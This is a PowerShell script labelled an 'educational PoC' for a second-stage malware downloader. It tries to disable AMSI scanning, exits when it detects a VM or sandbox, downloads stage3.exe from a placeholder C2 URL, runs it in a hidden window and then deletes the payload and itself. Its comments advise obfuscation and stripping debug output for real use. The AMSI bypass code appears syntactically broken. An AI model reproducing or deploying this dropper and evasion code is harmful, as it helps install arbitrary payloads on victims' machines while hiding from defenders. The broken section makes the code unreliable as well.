# Educational PoC: Stage 2 Downloader for PowerShell
# Fetches stage3.exe from C2, executes in memory, cleans up.
# Evasion: AMSI bypass, hidden execution, basic anti-VM.
# WARNING: Authorized pentesting only! Replace C2_URL.

# Stage 2 Start - Suppress errors and output
$ErrorActionPreference = 'SilentlyContinue'
[Console]::BufferWidth = 1
[Console]::BufferHeight = 1
[Console]::WindowWidth = 1
[Console]::WindowHeight = 1

# AMSI Bypass (crude, for demo - use reflective PE loaders in prod)
if (Get-Command AmsiScanBuffer -ErrorAction SilentlyContinue) {
    $a = [Ref].Assembly.GetTypes(); ForEach($b in $a) {if ($b.Name -like "*iUtils") {$c = $b};break}
    if ($c) {[Runtime.InteropServices.Marshal]::Copy($c.GetFields('NonPublic,Static') | Where-Object {$_.GetValue($null) -match "mscorlib"} | Select -First 1).GetValue($null), 0, [byte[]](0x58,0x90,0x60,0x00), 4) | Out-Null}
}

# Anti-analysis: Check for VM/sandbox
$vmIndicators = @("vbox", "vmware", "qemu", "xen", "sandbox", "cuckoo")
$sysInfo = Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Model
$procName = (Get-Process -Id $PID).ProcessName
if ($vmIndicators | Where-Object { $sysInfo -match $_ -or $procName -match $_ }) {
    exit  # Bail out quietly
}

# C2 Config (obfuscate in real use)
$C2Url = "http://example.com/stage3.exe"  # Replace with your payload URL
$PayloadPath = "$env:TEMP\stage3.exe"
$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Download payload (use Invoke-WebRequest for proxy support)
try {
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", $UserAgent)
    $webClient.DownloadFile($C2Url, $PayloadPath)
    Write-Host "[+] Payload downloaded to $PayloadPath" -ForegroundColor Green  # Debug; remove in prod
} catch {
    Write-Host "[-] Download failed: $_" -ForegroundColor Red
    exit 1
}

# Execute payload (in-memory preferred; here we drop and run for simplicity)
try {
    # Option 1: Run directly if EXE
    Start-Process -FilePath $PayloadPath -WindowStyle Hidden -PassThru | Wait-Process  # Wait for completion
    
    # Option 2: In-memory (for .NET/Reflective PE - advanced)
    # $bytes = [IO.File]::ReadAllBytes($PayloadPath)
    # $asm = [Reflection.Assembly]::Load($bytes)
    # $asm.EntryPoint.Invoke($null, @())
    
    Write-Host "[+] Stage 3 executed successfully" -ForegroundColor Green
} catch {
    Write-Host "[-] Execution failed: $_" -ForegroundColor Red
    exit 1
}

# Cleanup
Remove-Item $PayloadPath -Force
# Optional: Self-delete this script
$scriptPath = $MyInvocation.MyCommand.Path
Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue

# End of Stage 2 - Persistence or beacon could go here
